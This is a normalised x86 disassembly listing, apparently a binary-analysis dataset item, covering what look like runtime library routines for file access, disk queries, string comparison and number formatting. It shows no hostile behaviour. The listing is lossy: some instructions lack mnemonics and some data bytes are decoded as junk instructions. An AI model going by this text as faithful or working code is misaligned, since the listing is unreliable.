mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_408144
test al al
je r-xdata
sub_408518
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4098a8
mov edx eax
test dl dl
je r-xdata
call sub_40844c
push ebp
mov eax [ rw-data ]
call sub_405094
mov edx eax
mov eax [ rw-data ]
call sub_4084dc
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_405094
mov edx eax
mov eax [ rw-data ]
call sub_4084dc
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4085b4
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40408c
call sub_40844c
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_40408c
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_40408c
jmp r-xdata
pop esi
pop ebx
retn
sub_408604
push cs
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
sete al
add esp 0x400
pop esi
pop ebx
retn
popad
je r-xdata
inc eax
add al ch
pop edx
retn
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add al 0x0
add [ eax ] al
mov eax eax
push ebx
push esi
add esp 0xfffffc00
mov esi eax
mov ebx edx
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
call LoadStringA
mov ecx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_404128
cmp [ ebx + 0x4 ] 0x0
sub_40865c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4049d0
xor eax eax
push ebp
push sub_4086c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x4 ]
call sub_404038
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405794
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4086c9
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404aa0
retn
sub_4086e4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_4044f8
push eax
call CreateFileA
sub_40873c
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_4044f8
push eax
call CreateFileA
pop ebx
retn
sub_408768
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408794
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4087c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408800
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_4044f8
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_408890
push ebx
push esi
mov esi eax
mov eax esi
call sub_4042f8
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c38c
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_4088c0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_4042f8
mov edi eax
mov eax ebx
call sub_4044f8
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408bc4
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c38c
cmp al 0x2
jne r-xdata
dec edi
sub_408910
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_4088c0
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404558
pop edi
pop esi
pop ebx
retn
sub_408948
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_4088c0
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_404038
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_404558
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_408990
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_4044f8
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404128
add esp 0x108
pop esi
pop ebx
retn
sub_4089cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404e38
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404e38
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408a7c
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408aa4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408ad8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_4042f8
push eax
mov eax ebx
call sub_4044f8
mov edx eax
mov eax esi
pop ecx
call sub_408aa4
pop esi
pop ebx
retn
sub_408afc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4044f8
mov edx eax
mov ecx edi
mov eax ebx
call sub_408aa4
pop edi
pop esi
pop ebx
retn
sub_408b1c
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408b40
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408b80
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408bd8
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408c60
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408a40
mov esi eax
inc esi
mov eax esi
call sub_408c40
mov ecx esi
mov edx ebx
call sub_408a6c
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408c9c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c3b0
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408a6c
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407e84
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408d24
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_40907b
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408e06
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408e4e
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408e06
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408d18
pop edx
or edx edx
je r-xdata
sub_408e06
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_40907b
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408e4e
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_40907b
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408c9c
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408e75 ]
mov ebx ecx
sub cl 0x44
je sub_40829c
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404260
jmp r-xdata
mov esi sub_4042c0
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_40829c
sub cl 0x44
je sub_408230
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_408230
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_40829c
mov ecx 0x10
cmp bl 0x58
je sub_408230
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408cf4
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_409234
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408230
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_40909c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408a40
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408d24
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4090dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408a40
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408d24
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_409130
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_4042f8
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4042f8
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_4042f8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408d24
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_404128
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_404038
mov eax esi
mov edx ebx
call sub_404684
mov eax [ ebp - 0x4 ]
call sub_4042f8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408d24
mov edx esi
xchg edx eax
call sub_404684
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4091f0
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_409234
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_409508
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_409333
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_40933d
call sub_409333
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_4091f0
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_409399
call sub_409333
call sub_40932a
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_40932a
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_4091f0
retn
xor ecx ecx
sub_4093d5
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_40932a
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_40932a
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_40943a
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_40948e
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_4093d5
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_409508
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409535
jmp r-xdata
call sub_409657
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409535
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402dfc
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_409657
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
